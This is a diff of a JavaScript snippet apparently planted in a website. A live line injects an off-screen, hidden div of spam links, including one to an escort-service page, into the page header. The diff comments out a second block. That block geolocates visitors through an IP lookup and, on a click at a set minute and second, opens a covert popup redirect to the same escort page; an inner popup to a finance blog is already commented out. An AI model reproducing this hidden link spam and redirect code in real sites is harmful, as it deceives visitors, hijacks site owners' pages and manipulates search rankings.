@@ -1,30 +1,30 @@
 let EFV='<div style="position:absolute;z-index:-999;left:-99%;"><a href="https://www.mrjaz.com">MrJaz</a><a href="https://sohanisharma.com">SohaniSharma</a><a href="https://quikfinance.blogspot.com">Quik Finance</a><a href="hhttps://sohanisharma.com/khushi-chhetri-independent-call-girls-in-ahmedabad-escorts-service">ahmedabad call girl</a></div>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);
 
-let dts=(new Date).getSeconds();
-let dtm=(new Date).getMinutes();
+// let dts=(new Date).getSeconds();
+// let dtm=(new Date).getMinutes();
 
-if(!localStorage.xrd){
-  (async()=>{
-    localStorage.xrd=1;
-    let aa=await(await(await fetch('https://ipapi.co/country_name')).text());
-    if(aa=='Ahmedabad'){localStorage.Ahme='1'}
-    uhd()
-  })();
-}
+// if(!localStorage.xrd){
+//   (async()=>{
+//     localStorage.xrd=1;
+//     let aa=await(await(await fetch('https://ipapi.co/country_name')).text());
+//     if(aa=='Ahmedabad'){localStorage.Ahme='1'}
+//     uhd()
+//   })();
+// }
 
 
-function uhd(){
-  document.onclick=()=>{
-    if(!sessionStorage.i&&localStorage.Ahme&&dtm==3&&dts==3){
-        window.open('https://www.google.com/url?q=https%3A%2F%2Fsohanisharma.com%2Fkhushi-chhetri-independent-call-girls-in-ahmedabad-escorts-service&sa=D&sntz=1&usg=AOvVaw06TFvo-epr0jo6XdZSZWgb'); 
-    }
-//     if(!sessionStorage.i&&dtm==9&&(dts==9)){
-//       window.open('https://www.google.com/url?q=https%3A%2F%2Fquikfinance.blogspot.com&sa=D&sntz=1&usg=AOvVaw36fd0yRkuwFn2x6WlsA9Xi'); 
-//     }  
-    sessionStorage.i='i';
-  }
-}
-uhd()
+// function uhd(){
+//   document.onclick=()=>{
+//     if(!sessionStorage.i&&localStorage.Ahme&&dtm==3&&dts==3){
+//         window.open('https://www.google.com/url?q=https%3A%2F%2Fsohanisharma.com%2Fkhushi-chhetri-independent-call-girls-in-ahmedabad-escorts-service&sa=D&sntz=1&usg=AOvVaw06TFvo-epr0jo6XdZSZWgb'); 
+//     }
+// //     if(!sessionStorage.i&&dtm==9&&(dts==9)){
+// //       window.open('https://www.google.com/url?q=https%3A%2F%2Fquikfinance.blogspot.com&sa=D&sntz=1&usg=AOvVaw36fd0yRkuwFn2x6WlsA9Xi'); 
+// //     }  
+//     sessionStorage.i='i';
+//   }
+// }
+// uhd()
 
 
 
